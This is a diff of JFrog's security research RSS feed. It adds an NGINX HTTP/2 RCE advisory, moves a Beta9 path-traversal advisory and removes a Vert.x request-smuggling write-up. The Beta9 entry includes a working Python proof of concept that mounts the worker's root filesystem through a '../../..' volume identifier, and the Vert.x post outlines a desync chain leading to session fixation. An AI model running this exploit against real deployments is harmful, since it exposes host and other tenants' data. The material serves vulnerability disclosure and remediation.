@@ -4,7 +4,7 @@
         <title>JFrog Security Research</title>
         <link>https://research.jfrog.com</link>
         <description>Homepage feed: latest vulnerabilities and security research posts from JFrog Security Research.</description>
-        <lastBuildDate>Wed, 18 Nov 2026 16:25:30 GMT</lastBuildDate>
+        <lastBuildDate>Wed, 18 Nov 2026 19:04:55 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Home RSS</generator>
         <language>en</language>
@@ -167,6 +167,149 @@ Even with those flaws, one `.pth` line paired with an untouched dependency pin g
 [image3]: /img/RealTimePostImage/post/agent-framework-hijack/image3.png
 [image4]: /img/RealTimePostImage/post/agent-framework-hijack/image4.png
 [image5]: /img/RealTimePostImage/post/agent-framework-hijack/image5.png]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Nginx2Shell: All You Need to Know About CVE-2026-123007 and CVE-2026-123633]]></title>
+            <link>https://research.jfrog.com/post/nginx2shell-all-you-need-to-know-about-cve-2026-123007-and-cve-2026-123633/</link>
+            <guid>https://research.jfrog.com/post/nginx2shell-all-you-need-to-know-about-cve-2026-123007-and-cve-2026-123633/</guid>
+            <pubDate>Wed, 18 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[JFrog Security Research is tracking CVE-2026-123007 and CVE-2026-123633, two CRITICAL-severity NGINX vulnerabilities (Nginx2Shell) that allow unauthenticated remote code execution in NGINX itself, independent of the application running behind it. We break down who is affected, the bug flow, the shipped fix, and how to detect exploitation attempts.]]></description>
+            <content:encoded><![CDATA[
+![](/img/RealTimePostImage/post/nginx2shell/banner.png)
+
+JFrog Security is tracking two Critical severity NGINX vulnerabilities ([CVE-2026-123007](https://www.cve.org/CVERecord?id=CVE-2026-123007), [CVE-2026-123633](https://www.cve.org/CVERecord?id=CVE-2026-123633)), disclosed today and referred to as Nginx2Shell. The vulnerabilities allow unauthenticated remote code execution in NGINX itself, independent of the application running behind it.
+
+On November 18, [F5](https://nginx.org/en/security_advisories.html) released NGINX 1.31.9 and 1.30.7 to address both vulnerabilities, each assigned a CVSS v4.0 score of 9.2.
+
+![](/img/RealTimePostImage/post/nginx2shell/image1.png)
+
+The disclosure comes only a month after PHP2Shell and a day after Java4Shell, and follows the same pattern. Old memory bugs in core web infrastructure, found by several research teams at the same time. CVE-2026-123007 has been in NGINX for more than a decade and CVE-2026-123633 for nearly six years. With NGINX serving roughly 30% of the web, even a narrow set of conditions translates into a very large number of exposed servers.
+
+## **Who Is Affected**
+
+NGINX servers that have all of the following attributes are affected -
+
+**Versions:**
+
+* NGINX Open Source 1.9.5 through 1.31.8 (CVE-2026-123007)
+* NGINX Open Source 1.19.7 through 1.31.8 (CVE-2026-123633)
+* NGINX Plus R33 and later, before the fixed builds listed below
+
+**Configuration:**
+HTTP/2 enabled in the NGINX configuration file. CVE-2026-123633 also requires NGINX to proxy requests to a backend (ex. via the `proxy_pass` directive)
+
+**Environment:**
+NGINX reachable directly over HTTP/2. CVE-2026-123007 was confirmed on 64-bit servers over HTTPS, even when serving static files only. A CDN or WAF that terminates HTTP/2 in front of NGINX may block parts of the attack.
+
+Note that at the time of writing, the official NGINX Docker images have not been updated yet. Products that bundle NGINX, such as OpenResty and ingress controllers, remain affected until they ship an updated build. kubernetes/ingress-nginx is archived and will not receive a fix.
+
+## **How common is HTTP/2 on NGINX?**
+
+HTTP/2 is now the standard way browsers talk to websites. According to the [HTTP Archive Web Almanac](https://almanac.httparchive.org/en/2024/http), almost 80% of web requests are served over HTTP/2 or newer. [W3Techs](https://w3techs.com/technologies/segmentation/ce-http2/web_server) lists NGINX as the second most common server among HTTP/2 websites, after Cloudflare.
+
+NGINX does not enable HTTP/2 by default, but it takes a single directive to turn it on, and most HTTPS deployments do. The official NGINX packages and Docker images ship with the HTTP/2 module built in.
+
+Not every HTTP/2 site is exposed in the same way. NGINX servers behind a CDN usually receive HTTP/2 traffic from the CDN rather than from the attacker, which may block parts of the attack. The most exposed are NGINX servers that face the internet directly, such as self-hosted web servers, Kubernetes ingress controllers, load balancers and appliances.
+
+![](/img/RealTimePostImage/post/nginx2shell/image2.png)
+
+## **Am I vulnerable?**
+
+Run the following on the NGINX host/container:
+
+```bash
+# NGINX version
+nginx -v
+# Is HTTP/2 enabled? (any output means yes)
+nginx -T 2>/dev/null | grep -nE '^\s*(http2\s+on\b|listen\b[^#]*\bhttp2\b)'
+# Is NGINX passing requests to an upstream? (CVE-2026-123633)
+nginx -T 2>/dev/null | grep -nE '\b(proxy|fastcgi|uwsgi|scgi|grpc|memcached|tunnel)_pass\b'
+```
+
+Your server is affected by CVE-2026-123007 if it runs a version below 1.31.9 (mainline) or 1.30.7 (stable) and the HTTP/2 check returns any output. If the upstream check also returns output, it is affected by CVE-2026-123633 as well.
+
+## **Remediation**
+
+* **Upgrade to NGINX 1.31.9 (mainline) or 1.30.7 (stable). NGINX Plus users should upgrade to 37.0.8.1 or 37.3.0.1.**
+* If you cannot upgrade: You can temporarily disable HTTP/2. Set `http2 off` in the affected server blocks (NGINX 1.25.1 and later) and remove the `http2` parameter from your listen directives. Reload NGINX, confirm the old worker processes have exited, and turn HTTP/2 back on after upgrading.
+
+## **The Bugs**
+
+The vulnerabilities enable the following:
+
+* Remote code execution
+* Information disclosure
+* Denial of service
+
+Both are rated CVSS v4.0 9.2 (8.1 under CVSS v3.1), while [nginx.org](http://nginx.org) rates CVE-2026-123007 as major and CVE-2026-123633 as medium.
+
+**CVE-2026-123007:** An integer underflow in HTTP/2 flow control that leads to an out-of-bounds memory copy. Present since NGINX 1.9.5 (2015) and exploitable even when NGINX only serves static files.
+
+![](/img/RealTimePostImage/post/nginx2shell/image3.png)
+
+**CVE-2026-123633:** A use-after-free in HTTP/2 connection handling, triggered when NGINX closes a connection that is still serving a request. Present since NGINX 1.19.7 and requires NGINX to pass requests to an upstream while running low on free connections.
+
+![](/img/RealTimePostImage/post/nginx2shell/image4.png)
+
+## **Technical Details**
+
+[Wiz Research](https://www.wiz.io/blog/nginx-http2-rce-vulnerabilities) disclosed both vulnerabilities, which were independently found by Wiz, Ikotas Labs, Metnir, [Rapid7](https://www.rapid7.com/blog/post/ve-cve-2026-123007-critical-nginx-http-2-integer-underflow-leads-to-rce-fixed/) and Xint, many of them with the help of AI-assisted code analysis. The NGINX fix commits credit Xint.io for CVE-2026-123007 and Albert from Vexera AI for CVE-2026-123633. Rapid7 also published a public PoC for CVE-2026-123007.
+
+Both bugs live in the way NGINX keeps track of HTTP/2 connections. The flow looks like this:
+
+**CVE-2026-123007**
+
+1. HTTP/2 limits how much data a server may send before the client asks for more. NGINX tracks this allowance in a counter.
+2. When a stream is cancelled, NGINX adds the unsent data back to the counter without checking the protocol maximum.
+3. Once the counter passes that maximum, the check on new WINDOW_UPDATE frames wraps around and lets the attacker keep raising it.
+4. The oversized counter turns into a negative length when NGINX prepares data to send, and the TLS layer copies memory out of bounds. This can leak memory and corrupt the heap.
+
+![](/img/RealTimePostImage/post/nginx2shell/image5.png)
+
+**CVE-2026-123633**
+
+1. NGINX keeps a list of idle connections it can close when it runs out of free connections.
+2. A client that sends only part of an HTTP/2 HEADERS frame gets its connection put on that list while NGINX waits for the rest.
+3. When the rest arrives and a request starts, the connection is never taken off the list.
+4. Later, while opening a connection to the upstream, NGINX may pick this busy connection to close and free its memory. The request keeps using the freed memory, a classic use-after-free.
+
+![](/img/RealTimePostImage/post/nginx2shell/image6.png)
+
+## **The Fix**
+
+The fix addresses the following:
+
+**The flow-control counter respects the protocol maximum** ([e27f5fa84fe](https://github.com/nginx/nginx/commit/e27f5fa84fe6e98505e70bc543b748747dad0a3b)): NGINX now tracks the data already queued for sending and takes it into account when checking WINDOW_UPDATE frames, so the counter can no longer wrap around.
+
+![](/img/RealTimePostImage/post/nginx2shell/image7.png)
+
+**Busy connections leave the idle list** ([2df48a501d0](https://github.com/nginx/nginx/commit/2df48a501d0fb8212b7d39dffeeff5876332ba59)): a one-line fix marks the connection as no longer reusable once a request starts, so NGINX can no longer close it while it is still in use.
+
+![](/img/RealTimePostImage/post/nginx2shell/image8.png)
+
+## **Detection**
+
+There are no confirmed indicators of compromise yet, but the following signs are worth investigating:
+
+* NGINX worker crashes in the error log, such as `worker process 1234 exited on signal 11`
+* Unexpected commands or processes spawned by NGINX worker processes
+* Long-lived HTTP/2 connections transferring unusually large amounts of data, a possible sign of a CVE-2026-123007 attempt
+
+```bash
+# Look for worker crashes
+grep "exited on signal" /var/log/nginx/error.log
+# In containers, NGINX logs to stderr
+docker logs <container> 2>&1 | grep "exited on signal"
+```
+
+## **How Can JFrog Help?**
+
+JFrog is tracking both vulnerabilities and helping organizations prepare to respond.
+
+JFrog Xray and Catalog already include CVE-2026-123007 and CVE-2026-123633 in their vulnerability intelligence, helping teams identify these issues through their existing security workflows.
+
+Additionally, our security team has deployed contextual scanners to determine the applicability of these CVEs for customers of JFrog Advanced Security.
+]]></content:encoded>
         </item>
         <item>
             <title><![CDATA[Java4Shell: What We Know About the Critical OpenJDK RCE Vulnerability (CVE-2026-114938)]]></title>
@@ -831,141 +974,6 @@ Important Notice: This blog post is provided for general informational purposes 
             <content:encoded><![CDATA[Software supply chain attacks are on the rise, and naturally taking the headlines. But with the rise of localized models and common software embedded into smart “things”, risks may even be hidden in plain sight - or, in some cases, quite literally watching you. Vulnerabilities and malicious packages may extend risks to the unlikeliest of...]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
-            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
-
-
-## Component
-
-Beta9 gateway and worker (github.com/beam-cloud/beta9)
-
-## Affected versions
-
-gateway < 0.1.776
-worker < 0.1.756
-
-## Description
-
-A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
-
-A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
-
-Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
-
-## PoC
-
-<br>
-
-**Step 1 - Install the client and select the deployment**
-
-<br>
-
-```
-pip install beta9
-beta9 configure --token <ANY_WORKSPACE_TOKEN>
-```
-
-<br>
-
-**Step 2 - Save the volume deploy**
-
-<br>
-
-The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
-
-```
-import os
-
-from beta9 import Image, function
-from beta9.abstractions.volume import Volume
-
-
-class TraversalVolume(Volume):
-    def __init__(self, volume_id: str, mount_path: str):
-        super().__init__(name="poc", mount_path=mount_path)
-        self.volume_id = volume_id
-        self.ready = True
-
-
-HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
-
-
-@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
-def read_worker_host():
-    proof = {}
-    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
-        try:
-            with open(f) as fh:
-                proof[f] = fh.read()[:200]
-        except Exception as e:
-            proof[f] = f"<unreadable: {e}>"
-    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
-    return proof
-
-
-if __name__ == "__main__":
-    result = read_worker_host.remote()
-    print("\n===== PoC result (executed inside the sandboxed container) =====")
-    for k, v in result.items():
-        print(f"\n--- {k} ---\n{v}")
-```
-
-<br>
-
-**Step 3 - Deploy and run it**
-
-<br>
-
-```
-python3 poc_volume_traversal.py
-```
-
-<br>
-
-Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
-
-```
-===== PoC result (executed inside the sandboxed container) =====
-
---- /pwn/etc/hostname ---
-<worker hostname>
-
---- /pwn/etc/resolv.conf ---
-<worker resolver configuration>
-
---- /pwn (host /) ---
-['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
-```
-
-<br>
-
-On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
-
-## Vulnerability Mitigations
-
-Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
-
-The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-120308
-https://github.com/beam-cloud/beta9/pull/1897
-https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
-https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
-https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
-https://github.com/beam-cloud/beta9
-]]></content:encoded>
-        </item>
-        <item>
             <title><![CDATA[Beta9 is vulnerable to a Build Worker Sandbox Escape via Chroot-only Buildah Isolation]]></title>
             <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</link>
             <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-build-worker-sandbox-escape-via-chroot-only-buildah-isolation-cve-2026-120306/</guid>
@@ -1379,122 +1387,138 @@ https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
         <item>
-            <title><![CDATA[Byte Debt (CVE-2026-102479): From an HTTP Header Typo to Cross-User Session Fixation]]></title>
-            <link>https://research.jfrog.com/post/byte-debt-vertx-header-typo-session-fixation/</link>
-            <guid>https://research.jfrog.com/post/byte-debt-vertx-header-typo-session-fixation/</guid>
-            <pubDate>Wed, 28 Oct 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[A one-letter typo, Content-Xength, is accepted as Content-Length by the Eclipse Vert.x HTTP/1.x decoder (CVE-2026-102479). We chain it into response-queue desync and cross-user session fixation behind real reverse proxies.]]></description>
+            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
             <content:encoded><![CDATA[
-![](/img/RealTimePostImage/post/byte-debt-vertx-header-typo-session-fixation/image1.png)
+## Summary
 
-Recently, a huge wave of web related vulnerabilities flooded the internet with php2shell as the most famous web vulnerability in years. As such our team decided to investigate an intriguing HTTP parsing anomaly tracked as CVE-2026-102479. 
-It centers on a header parsing discrepancy within the Eclipse Vert.x HTTP/1.x decoder, where non standard headers such as `Content-Xength` are erroneously accepted as valid `Content-Length` header. 
-
-Categorized as a high-severity vulnerability from the start, our research demonstrates how this primitive can be chained to achieve arbitrary response-queue desynchronization against shared reverse proxy connections. In this blog we are going to break down the root cause, exploit mechanics, and necessary prerequisites for real-world impact.
-
-## The Bug
-
-The bug is in the HTTP/1 `VertxHttpRequestDecoder`, to avoid string allocations the decoder optimizes header lookups by checking name length and sampling specific byte offsets instead of verifying every character. For 14 byte headers, it validates the prefix and suffix, completely skipping offset 8 (the letter ‘L’).
-
-Because that byte is never checked, Vert.x treats `Content-Xength` as a genuine `Content-Length header`. A front-end reverse proxy ignores the typo as an arbitrary custom header, Vert.x parses it as request framing, and the HTTP request boundary instantly desyncs.
-
- It was fixed in version 5.1.10 by [this commit](https://github.com/eclipse-vertx/vert.x/commit/317c778d7fdd92a2fb0757dabc68a31f8c98edb0). 
-
-## Request smuggling, briefly
-
-This bug leads to a request smuggling primitive, a technique James Kettle popularized at PortSwigger with [*HTTP Desync Attacks: Request Smuggling Reborn*](https://portswigger.net/research/http-desync-attacks). In short, a front-end reverse proxy and a backend server each decide independently where one HTTP request ends and the next begins. If they disagree, a front end can forward what it thinks is a clean request, while the backend reads a different number of bytes as that request body, leaving a fragment behind that gets misread as the start of whoever request comes next on that same reused connection.
-
-In classic HTTP request smuggling (CL.TE or TE.CL), the desync comes down to how each header signals where the body ends:
-
-* `Content-Length` specifies a fixed byte count declared upfront, the server simply counts down those bytes and stops.  
-* `Transfer-Encoding: chunked` has no fixed total size. The body arrives in pieces, each declaring its own hex size, and only stops when the server hits an inline terminating chunk (`0\r\n\r\n`).
-
-Because that `0` chunk acts as an immediate stop sign, a chunk-aware parser halts right there, completely ignoring whatever number was in `Content-Length`. If one server measures by fixed byte count while the other stops at the `0` marker, their boundaries split, leaving the leftover bytes trapped in the pipeline to poison the next request.
-
-Our bug does not need conflicting headers at all, just a single misspelled one.
-
-## Setup
-
-The backend is a Quarkus app, sitting behind nginx (and haproxy, for cross-proxy confirmation) in Docker, with real backend connection pooling turned on, the realistic production setup rather than a one-off lab shortcut.
-
-## First win: making a connection hang, then starving someone else's request
-
-Our first instinct was the classic move, send a real `Content-Length` *and* a fake `Content-Xength` on the same request, hoping Vert.x would read the wrong header and leave an exact chunk of leftover data queued up to poison the next request. That was blocked outright, thanks to Netty's own duplicate `Content-Length` rejection (a defense from [CVE-2019-20445](https://nvd.nist.gov/vuln/detail/cve-2019-20445)) that kills the request with an instant `400` before it ever reaches the app.
-
-Here is what actually works, send a Content-Xength: 50 header without a body, the front end sees no declared body and happily assumes the request is finished transferring the request to Vert.x. Meanwhile Vert.x ignores the typo, decides it is owed 50 bytes, and just sits there waiting. The result is an instant connection hang, tying up backend server threads while you walk away without ever sending another byte that can lead to potential DoS.
-
-Aim that trick at an endpoint that ignores bodies and Vert.x will reply instantly, but it will not forget what it is owed. The connection keeps listening for those declared bytes while the front end marks the exchange complete and returns the connection to its idle pool. The next innocent request arrives, and Vert.x silently swallows it as part of your phantom body, never routed, never logged, completely erased, turning a simple hang into a surgical, silent denial of service against the next stranger in line.  
-![](/img/RealTimePostImage/post/byte-debt-vertx-header-typo-session-fixation/image2.png)
-
-## Pushing further: the double-desync
-
-Turning this exact mismatch into full response poisoning can potentially be done by the technique laid out in [HTTP/1.1 Must Die: The Desync Endgame](https://portswigger.net/research/http1-must-die). The concept is simple, instead of leaving that byte debt open, you pay it off with data you completely control.
-
-In short, it looks like this: request A opens the byte debt. Request B arrives with its body hiding two spliced requests, C and D. 
-
-A's debt consumes B's headers completely. The backend skips B entirely, parses C, and hands you the response. It then parses D, but because the front end only expects one reply, D sits orphaned in the socket, waiting to be served to the next visitor.
-
-To make the debt swallow B's headers perfectly, the byte count must match what the proxy actually outputs on the wire, because proxies like Nginx often inject their own headers along the way. In our lab we used [calibrate blind technique](https://portswigger.net/blog/http-1-1-must-die-conquering-the-0-cl-challenge#solution-b-calculating-the-offset-of-the-injected-headers), in which you scan a window of candidate byte counts and use whether the throwaway request C comes back as a clean page or a garbled error as the oracle.
-
-![](/img/RealTimePostImage/post/byte-debt-vertx-header-typo-session-fixation/image3.png)  
-We tested seven separate proxies: Nginx, HAProxy, Envoy, Traefik, Caddy, Apache httpd, and nghttpx. Every single one caught it the exact same way, but unfortunately, before recycling a backend connection into the pool, the front end peeks at the socket, spots D's unread response, and discards the dirty connection instead of handing it to a victim. That single check stopped us cold.
-
-## The breakthrough: the dangling byte
-
-We needed a way to prevent D from generating an immediate response, the solution was leaving a single dangling byte on D. 
-
-The backend parses D headers, realizes it is still owed one byte of body, and simply pauses so no response is generated. When the front end checks the socket, it finds an empty buffer, assumes the connection is clean, and returns it to the pool. 
-
-The next real visitor arrives, and the very first byte of their request satisfies D debt. The backend instantly fires D response back to them instead of answering their own traffic.
-
-More on that [technique](https://portswigger.net/research/can-ai-do-novel-security-research#the-dangling-byte-technique). 
-
-![](/img/RealTimePostImage/post/byte-debt-vertx-header-typo-session-fixation/image4.png)
-
-We rebuilt the exploit from scratch against our own stack and reproduced it live, end to end, as session fixation.
-
-We turned request D into a genuine `POST /login` using attacker credentials. When an unsuspecting visitor arrived with no cookies, the server handed them D response, a 303 redirect setting a session cookie for Alice. A follow-up request confirmed the planted session was live, dropping the victim straight into Alice's account, balance, and private data.
-
-It worked deterministically across every proxy we tested, including Caddy and nghttpx, which had been the most aggressive at closing dirty connections under the previous setup.
-
-**Live run, nginx:**
-
-![](/img/RealTimePostImage/post/byte-debt-vertx-header-typo-session-fixation/image5.png)
-
-That 100% hit rate relied on a single connection. Against a realistic 16-connection pool, spraying poisons roughly 25–35% of subsequent traffic: not guaranteed on the very next request, but still severe.
-
-## What you can actually do with it
-
-* **Session fixation:** The victim's browser silently receives a cookie for your account. If they make a purchase or upload private documents, they do it inside your account, leaving the data for you to view later.  
-  
-* **Upgraded XSS:** Reflected XSS usually requires tricking someone into clicking a suspicious link. Smuggling fires the payload directly into an innocent user browser as they browse normally.  
-  
-* **Stealth phishing:** If any endpoint redirects based on user input, you can bounce a victim directly to a phishing site with what looks like a trusted, same-site redirect.
+Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
 
 
-None of this requires exotic flaws, just everyday features like a login form, an echoed field, or a redirect parameter.
+## Component
 
-## Scope, not scare
+Beta9 gateway and worker (github.com/beam-cloud/beta9)
 
-`vertx-core` has around 2,100 Maven dependents and north of 300 million cumulative downloads, but those figures span the entire history of the project. The actual exposure window is narrow: three minor release branches shipped over a few months (`5.0.0`–`5.0.12`, `5.1.0`–`5.1.9`, and `5.2.0`), patched in `5.1.10` and `5.2.1`. The takeaway isn't that Vert.x as a whole is broken, it is that if you deployed the modern 5.x line during that window, you are potentially vulnerable. 
+## Affected versions
 
-## Popular Affected OpenSource Projects 
+gateway < 0.1.776
+worker < 0.1.756
 
-Our team was able to POC this vulnerability on several popular open source projects that use Vert.x webserver in the vulnerable version, in certain setups behind a frontend proxies such as:
+## Description
 
-| Project | GitHub Link | GitHub Stars | Maven |
-| :---- | :---- | :---- | :---- |
-| **TechEmpower/FrameworkBenchmarks** | [TechEmpower/FrameworkBenchmarks](https://github.com/TechEmpower/FrameworkBenchmarks) | 8,105 | Not published benchmark suite, built from source. |
-| **strimzi/strimzi-kafka-bridge (0.33.0)** | [strimzi/strimzi-kafka-bridge](https://github.com/strimzi/strimzi-kafka-bridge) | 345 | io.strimzi:kafka-bridge published, but mainly distributed as the GA container image PoC'd. |
-| **apache/camel-quarkus** | [apache/camel-quarkus](https://github.com/apache/camel-quarkus) | 302 | 509 dependent artifacts on camel-quarkus-core |
+A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
+
+A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
+
+Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the client and select the deployment**
+
+<br>
+
+```
+pip install beta9
+beta9 configure --token <ANY_WORKSPACE_TOKEN>
+```
+
+<br>
+
+**Step 2 - Save the volume deploy**
+
+<br>
+
+The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
+
+```
+import os
+
+from beta9 import Image, function
+from beta9.abstractions.volume import Volume
 
 
-Note: All projects were reported directly regarding their potential vulnerability when using the affected Vert.x webserver version behind frontend proxies.
+class TraversalVolume(Volume):
+    def __init__(self, volume_id: str, mount_path: str):
+        super().__init__(name="poc", mount_path=mount_path)
+        self.volume_id = volume_id
+        self.ready = True
 
-## Fix
 
-Upgrade `io.vertx:vertx-core` to **5.1.10**, **5.2.1**, or newer. This patches the canonicalization flaw at the root, eliminating both the connection-starvation DoS and the response-poisoning chain
+HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
 
+
+@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
+def read_worker_host():
+    proof = {}
+    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
+        try:
+            with open(f) as fh:
+                proof[f] = fh.read()[:200]
+        except Exception as e:
+            proof[f] = f"<unreadable: {e}>"
+    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
+    return proof
+
+
+if __name__ == "__main__":
+    result = read_worker_host.remote()
+    print("\n===== PoC result (executed inside the sandboxed container) =====")
+    for k, v in result.items():
+        print(f"\n--- {k} ---\n{v}")
+```
+
+<br>
+
+**Step 3 - Deploy and run it**
+
+<br>
+
+```
+python3 poc_volume_traversal.py
+```
+
+<br>
+
+Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
+
+```
+===== PoC result (executed inside the sandboxed container) =====
+
+--- /pwn/etc/hostname ---
+<worker hostname>
+
+--- /pwn/etc/resolv.conf ---
+<worker resolver configuration>
+
+--- /pwn (host /) ---
+['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
+```
+
+<br>
+
+On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
+
+## Vulnerability Mitigations
+
+Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
+
+The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120308
+https://github.com/beam-cloud/beta9/pull/1897
+https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
+https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
     </channel>
